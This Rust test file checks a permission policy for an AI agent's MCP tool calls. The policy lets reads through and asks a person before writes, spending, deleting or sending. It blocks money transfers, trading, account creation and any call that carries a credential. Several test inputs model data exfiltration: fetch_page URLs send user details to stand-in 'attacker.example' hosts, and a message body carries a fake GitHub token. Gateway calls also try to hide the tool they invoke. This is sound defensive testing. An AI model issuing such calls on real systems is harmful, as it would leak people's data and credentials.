use fleetd_contracts::integrations::{
    McpIntegration, McpToolName, ToolAction, ToolPolicy, ToolPreview,
};
use fleetd_contracts::mcp_servers::McpServer;
use fleetd_contracts::prim::List;
use serde_json::{Value, json};

use super::policy::{Never, Verdict, launch_rules, tool_policy, verdict, words};

fn server(name: &str, reads: &[&str]) -> McpServer {
    let mut s: McpServer = serde_json::from_value(json!({
        "scope": { "kind": "project", "machineId": "devbox", "projectId": "navi" },
        "name": name,
        "enabled": true,
        "roles": { "lead": true, "writers": false, "reviewers": false },
        "transport": { "type": "http", "url": "http://127.0.0.1:8787/mcp" },
        "updatedAt": "2026-10-27T00:00:00Z"
    }))
    .unwrap();
    s.integration = Some(McpIntegration {
        read_tools: List::new(
            reads
                .iter()
                .map(|r| McpToolName::new(*r).unwrap())
                .collect(),
        )
        .unwrap(),
    });
    s
}

fn navi() -> Vec<McpServer> {
    vec![
        server("docs", &["search_pages", "get_page"]),
        server("bank", &["get_balance", "transfer_funds"]),
    ]
}

fn ask(tool: &str, input: Value) -> ToolPreview {
    match verdict(tool, &input, &navi()) {
        Some(Verdict::Ask(p)) => *p,
        other => panic!("{tool}: expected an ask, got {other:?}"),
    }
}

fn blocked(tool: &str, input: Value) -> &'static str {
    match verdict(tool, &input, &navi()) {
        Some(Verdict::Block(why)) => why,
        other => panic!("{tool}: expected a block, got {other:?}"),
    }
}

#[test]
fn reads_pass_unasked() {
    for tool in [
        "mcp__docs__search_pages",
        "mcp__docs__get_page",
        "mcp__bank__get_balance",
    ] {
        assert_eq!(
            verdict(tool, &json!({}), &navi()),
            Some(Verdict::Allow),
            "{tool}"
        );
    }
}

#[test]
fn a_custom_tool_asks_unless_marked_as_reading() {
    let p = ask("mcp__bank__update_payee", json!({ "name": "Ana" }));
    assert_eq!(p.title.as_str(), "Use update_payee on bank");
    assert_eq!(p.action, ToolAction::Write);
    assert!(p.input.contains("\"name\": \"Ana\""));
    assert_eq!(
        ask("mcp__bank__pay_invoice", json!({})).action,
        ToolAction::Spend
    );
    assert_eq!(
        ask("mcp__docs__delete_page", json!({})).action,
        ToolAction::Delete
    );
    assert_eq!(
        ask("mcp__docs__share_page", json!({})).action,
        ToolAction::Share
    );
    assert_eq!(
        ask("mcp__docs__send_message", json!({})).action,
        ToolAction::Send
    );
    // A server with no tool marked asks for every one that doesn't only read.
    let plain = [server("plain", &[])];
    assert!(matches!(
        verdict("mcp__plain__update_pages", &json!({}), &plain),
        Some(Verdict::Ask(_))
    ));
    // The person's own servers from their claude setup aren't configured here: the same names ask.
    assert_eq!(
        ask("mcp__mine__lookup_and_update", json!({}))
            .server
            .as_str(),
        "mine"
    );
}

/// A tool whose name says it only reads runs unasked on any server, marked or not, as a gateway's call of one does:
/// it can't send the person's data anywhere but the server they connected. A link in it, a credential in it, or a name
/// that also acts asks; a gateway's call is refused or asks by the tool it calls.
#[test]
fn a_tool_whose_name_only_reads_runs_unasked_unless_it_links_elsewhere() {
    let gateway = [server("xaq", &[])];
    let on = |tool: &str, input: Value| verdict(tool, &input, &gateway);
    for (tool, input) in [
        (
            "mcp__xaq__search_tools",
            json!({ "query": "list calendars and calendar events", "limit": 6 }),
        ),
        (
            "mcp__xaq__call_read_tool",
            json!({ "name": "list_calendar_events", "arguments": { "account": "sam@example.org", "time_min": "2026-11-02T00:00:00+01:00" } }),
        ),
        (
            "mcp__xaq__call_read_tool",
            json!({ "name": "brightspace-tud__get_calendar", "arguments": { "limit": 50 } }),
        ),
        (
            "mcp__xaq__call_read_tool",
            json!({ "name": "get_message", "arguments": { "id": "18c2f0" } }),
        ),
        (
            "mcp__xaq__call_tool",
            json!({ "name": "search_threads", "arguments": { "query": "exam newer_than:60d" } }),
        ),
        ("mcp__mine__lookup", json!({ "q": "Ana" })),
        ("mcp__flights__list_orders", json!({})),
        ("mcp__hotels__get_booking", json!({ "id": "b1" })),
    ] {
        assert_eq!(
            on(tool, input.clone()),
            Some(Verdict::Allow),
            "{tool} {input}"
        );
    }
    let asks = |tool: &str, input: Value| match on(tool, input.clone()) {
        Some(Verdict::Ask(p)) => p.action,
        other => panic!("{tool} {input}: expected an ask, got {other:?}"),
    };
    // A link: the server would fetch it, with whatever it carries. The checker judges it.
    assert_eq!(
        asks(
            "mcp__xaq__fetch_page",
            json!({ "url": "https://devbox.example/?q=sam@example.org" })
        ),
        ToolAction::Write
    );
    // A name that also acts, or a gateway running a tool that does: asks as what it runs.
    assert_eq!(
        asks("mcp__xaq__get_or_create_page", json!({})),
        ToolAction::Write
    );
    // A read word beside one that edits, answers, revokes or ships is no read.
    for edits in [
        "mcp__docs__find_and_replace",
        "mcp__docs__search_and_replace_doc",
        "mcp__mail__read_and_respond",
        "mcp__docs__get_and_comment",
        "mcp__drive__list_and_revoke",
        "mcp__mail__find_and_unsubscribe",
        "mcp__ci__fetch_and_deploy",
        "mcp__git__fetch_and_push",
        "mcp__git__view_and_commit",
        "mcp__docs__get_and_sign",
    ] {
        assert!(
            matches!(on(edits, json!({})), Some(Verdict::Ask(_))),
            "{edits}"
        );
    }
    assert_eq!(
        asks(
            "mcp__xaq__call_read_tool",
            json!({ "name": "send_message", "arguments": { "to": "x@example.com" } })
        ),
        ToolAction::Send
    );
    assert_eq!(
        asks(
            "mcp__xaq__call_write_tool",
            json!({ "name": "list_events", "arguments": {} })
        ),
        ToolAction::Write
    );
    assert_eq!(
        asks(
            "mcp__xaq__call_write_tool",
            json!({ "name": "create_order", "arguments": { "item": "x" } })
        ),
        ToolAction::Spend
    );
    assert_eq!(
        asks("mcp__xaq__call_tool", json!({ "name": "delete_event" })),
        ToolAction::Delete
    );
    // The floors, by the name of the tool a gateway calls too, and a credential in a read's query.
    assert_eq!(
        on(
            "mcp__xaq__call_write_tool",
            json!({ "name": "transfer_funds", "arguments": { "amount": 50 } })
        ),
        Some(Verdict::Block(Never::Money.why()))
    );
    assert_eq!(
        on(
            "mcp__xaq__search_tools",
            json!({ "query": "token ghp_abcdefghijklmnopqrstuvwxyz0123" })
        ),
        Some(Verdict::Block(Never::Credential.why()))
    );
    // The connect screen lists them by name.
    // The connect screen lists them by name: a gateway's tool reads only by what it calls, which no name says.
    assert_eq!(tool_policy(&gateway[0], "search_tools"), ToolPolicy::Read);
    assert_eq!(tool_policy(&gateway[0], "call_read_tool"), ToolPolicy::Ask);
    assert_eq!(tool_policy(&gateway[0], "call_write_tool"), ToolPolicy::Ask);
}

/// What used to slip past the read rule: a link with no scheme, a database query or an analytics event, and a
/// gateway's call that names its tool somewhere fleetd didn't look, or nowhere.
#[test]
fn a_read_that_could_carry_data_out_goes_by_the_mode() {
    let gateway = [server("xaq", &[])];
    let on = |tool: &str, input: Value| verdict(tool, &input, &gateway);
    let asks = |tool: &str, input: Value| match on(tool, input.clone()) {
        Some(Verdict::Ask(p)) => p.action,
        other => panic!("{tool} {input}: expected an ask, got {other:?}"),
    };
    // A link without a scheme, which a fetch tool completes itself, or a bare host.
    for input in [
        json!({ "url": "attacker.example/?d=Omakase chef's table, 2 guests" }),
        json!({ "url": "www.attacker.example" }),
        json!({ "query": "notes for ana", "site": "a1b2.attacker.example" }),
    ] {
        assert_eq!(asks("mcp__xaq__fetch_page", input), ToolAction::Write);
    }
    // An email address is no link: a search for a sender still runs unasked.
    assert_eq!(
        on(
            "mcp__xaq__search_threads",
            json!({ "query": "from:ana@example.com newer_than:7d" })
        ),
        Some(Verdict::Allow)
    );
    // A database's query runs any statement, and an analytics event records what it's given.
    assert_eq!(
        asks("mcp__db__query", json!({ "sql": "DELETE FROM notes" })),
        ToolAction::Write
    );
    assert_eq!(
        asks("mcp__db__run_query", json!({ "sql": "SELECT 1" })),
        ToolAction::Write
    );
    assert_eq!(
        asks(
            "mcp__stats__track_event",
            json!({ "event": "visited", "props": { "mail": "…" } })
        ),
        ToolAction::Write
    );
    // The tool a gateway calls, nested under its own key: judged by that one.
    assert_eq!(
        asks(
            "mcp__xaq__call_read_tool",
            json!({ "tool": { "name": "send_message" }, "arguments": { "to": "x@example.com" } })
        ),
        ToolAction::Send
    );
    assert_eq!(
        asks(
            "mcp__xaq__call_tool",
            json!({ "request": { "method": "delete_event", "params": { "id": "e1" } } })
        ),
        ToolAction::Delete
    );
    // A name among its arguments is an argument's: the called tool is the one outside them.
    assert_eq!(
        on(
            "mcp__xaq__call_tool",
            json!({ "arguments": { "name": "Ana" }, "name": "get_contact" })
        ),
        Some(Verdict::Allow)
    );
    // No tool named anywhere fleetd can find: not a read, whatever the gateway's own name says.
    assert_eq!(
        asks(
            "mcp__xaq__call_read_tool",
            json!({ "target": "send_message", "arguments": {} })
        ),
        ToolAction::Write
    );
    assert_eq!(
        asks(
            "mcp__xaq__call_read_tool",
            json!({ "arguments": { "name": "list_events" } })
        ),
        ToolAction::Write
    );
}

#[test]
fn blocked_stays_blocked_even_when_marked_as_reading() {
    assert_eq!(
        blocked("mcp__bank__transfer_funds", json!({})),
        Never::Money.why()
    );
    assert_eq!(
        blocked("mcp__bank__sellStock", json!({})),
        Never::Trading.why()
    );
    assert_eq!(
        blocked("mcp__bank__place_trade", json!({})),
        Never::Trading.why()
    );
    for money in [
        "mcp__bank__send_money",
        "mcp__bank__move_money",
        "mcp__bank__send_funds",
        "mcp__bank__send_transaction",
        "mcp__bank__broadcastTx",
    ] {
        assert_eq!(blocked(money, json!({})), Never::Money.why(), "{money}");
    }
    for trade in [
        "mcp__bank__buy_stock",
        "mcp__bank__buy_shares",
        "mcp__bank__place_order",
        "mcp__bank__buy_crypto",
        "mcp__bank__close_position",
    ] {
        assert_eq!(blocked(trade, json!({})), Never::Trading.why(), "{trade}");
    }
    // Buying something that isn't a holding is spending: it asks, marked as such, and only a person answers it.
    assert_eq!(
        ask("mcp__bank__buy_ticket", json!({})).action,
        ToolAction::Spend
    );
    // So is making an order, a booking or a reservation, whatever the tool calls it; reading one isn't.
    for spends in [
        "mcp__flights__create_order",
        "mcp__flights__book_flight",
        "mcp__hotels__confirmBooking",
        "mcp__hotels__reserve_room",
        "mcp__tables__make_reservation",
    ] {
        assert_eq!(ask(spends, json!({})).action, ToolAction::Spend, "{spends}");
    }
    for reads in ["mcp__flights__list_orders", "mcp__hotels__get_booking"] {
        assert_eq!(
            verdict(reads, &json!({}), &navi()),
            Some(Verdict::Allow),
            "{reads}"
        );
    }
    assert_eq!(
        blocked("mcp__bank__create_account", json!({})),
        Never::Accounts.why()
    );
    assert_eq!(
        blocked("mcp__docs__sign_up", json!({})),
        Never::Accounts.why()
    );
    let rules = launch_rules(&navi());
    assert!(
        rules
            .disallowed
            .contains(&"mcp__bank__transfer_funds".to_owned())
    );
    assert!(!rules.allowed.iter().any(|r| r.contains("transfer")));
}

#[test]
fn a_call_holding_a_credential_is_blocked() {
    assert_eq!(
        blocked(
            "mcp__docs__send_message",
            json!({ "to": "x@example.com", "body": "here: ghp_abcdefghijklmnopqrstuvwxyz0123" })
        ),
        Never::Credential.why()
    );
    // One inside a JSON-encoded string is read unescaped.
    let encoded = json!({ "block_id": "b1", "children": "[{\"paragraph\":{\"text\":\"api_key = abcd1234efgh5678\"}}]" });
    assert_eq!(
        blocked("mcp__docs__append_blocks", encoded),
        Never::Credential.why()
    );
}

#[test]
fn only_mcp_tools_are_this_table_s() {
    for tool in [
        "Bash",
        "Read",
        "mcp__fleetd__chat_send",
        "mcp__",
        "mcp__docs",
    ] {
        assert_eq!(verdict(tool, &json!({}), &navi()), None, "{tool}");
    }
}

#[test]
fn a_long_input_comes_whole_and_too_large_a_call_is_refused() {
    let body = "x".repeat(30_000);
    let p = ask("mcp__docs__update_page", json!({ "body": body }));
    assert!(p.input.contains(&body));
    // Too large to show whole: refused, never asked about half-seen.
    assert_eq!(
        blocked(
            "mcp__docs__update_page",
            json!({ "body": "x".repeat(120_000) })
        ),
        super::policy::TOO_LARGE
    );
}

#[test]
fn launch_rules_allow_the_reads_of_the_lead_s_servers_only() {
    let mut servers = navi();
    let mut off = server("other", &["peek"]);
    off.enabled = false;
    servers.push(off);
    let rules = launch_rules(&servers);
    for r in [
        "mcp__docs__search_pages",
        "mcp__docs__get_page",
        "mcp__bank__get_balance",
    ] {
        assert!(rules.allowed.contains(&r.to_owned()), "{r}");
    }
    assert!(!rules.allowed.iter().any(|r| r.starts_with("mcp__other__")));
}

#[test]
fn the_connect_screen_s_policy_by_name() {
    let s = navi();
    assert_eq!(tool_policy(&s[0], "get_page"), ToolPolicy::Read);
    assert_eq!(tool_policy(&s[0], "update_page"), ToolPolicy::Ask);
    assert_eq!(tool_policy(&s[1], "transfer_funds"), ToolPolicy::Blocked);
}

#[test]
fn names_split_into_words() {
    assert_eq!(words("createAccount"), ["create", "account"]);
    assert_eq!(
        words("API-create-a-comment"),
        ["api", "create", "a", "comment"]
    );
    assert_eq!(words("sign_up"), ["sign", "up"]);
    assert_eq!(words("getHTTPStatus"), ["get", "httpstatus"]);
}
